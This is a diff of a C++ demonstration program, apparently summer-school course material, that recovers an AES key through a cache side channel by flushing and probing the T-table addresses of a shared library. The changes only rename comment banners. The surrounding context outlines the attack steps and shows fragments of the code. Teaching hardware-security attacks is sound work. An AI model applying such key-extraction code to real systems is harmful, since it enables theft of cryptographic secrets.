@@ -17,7 +17,7 @@
 #include <sys/socket.h>
 #include <iomanip>
 
-// ******** FDP Demo ********
+// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 // this number varies on different systems
 #define MIN_CACHE_MISS_CYCLES (205)
 // ************************************
@@ -143,7 +143,7 @@ int main(int argc, char *argv[])
         map_size += 1;
     }
     char *base = (char *)mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
-    // ******** FDP Demo ********
+    // ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
     // contains addresses for T0-T3 tables
     char *probe[] = {
         base + 0x1df000, base + 0x1df400, base + 0x1df800, base + 0x1dfc00
@@ -180,7 +180,7 @@ int main(int argc, char *argv[])
         // generate random plaintext
         for (size_t j = 0; j < 16; ++j)
             plaintext[j] = rand() % 256;
-        // ******** FDP Demo ********
+        // ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
         // Step 1: flush the T0 table and get the ciphertext
         if (debug_flag)
             printf("Flushing the T0 table..\n");
@@ -216,7 +216,7 @@ int main(int argc, char *argv[])
         // generate random plaintext
         for (size_t j = 0; j < 16; ++j)
             plaintext[j] = rand() % 256;
-        // ******** FDP Demo ********
+        // ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
         // Step 1: flush the T1 table and get the ciphertext
         if (debug_flag)
             printf("Flushing the T1 table..\n");
@@ -251,7 +251,7 @@ int main(int argc, char *argv[])
         // generate random plaintext
         for (size_t j = 0; j < 16; ++j)
             plaintext[j] = rand() % 256;
-        // ******** FDP Demo ********
+        // ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
         // Step 1: flush the T2 table and get the ciphertext
         if (debug_flag)
             printf("Flushing the T2 table..\n");
@@ -286,7 +286,7 @@ int main(int argc, char *argv[])
         // generate random plaintext
         for (size_t j = 0; j < 16; ++j)
             plaintext[j] = rand() % 256;
-        // ******** FDP Demo ********
+        // ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
         // Step 1: flush the T3 table and get the ciphertext
         if (debug_flag)
             printf("Flushing the T3 table..\n");
@@ -350,7 +350,7 @@ int main(int argc, char *argv[])
     }
     printf("\n");
 
-    // ******** FDP Demo ********
+    // ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
     // Step 4: Guess the last round key using the cache misses
 
     // count potential key candidates by XORing these low missrate ciphertext bytes with S-box values
@@ -408,7 +408,7 @@ int main(int argc, char *argv[])
     }
     printf("\n");
 
-    // ******** FDP Demo ********
+    // ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
     // Step 5: Extract the 128-bit key using the guessed last round key
 
     // algorithm to recover the master key from the last round key
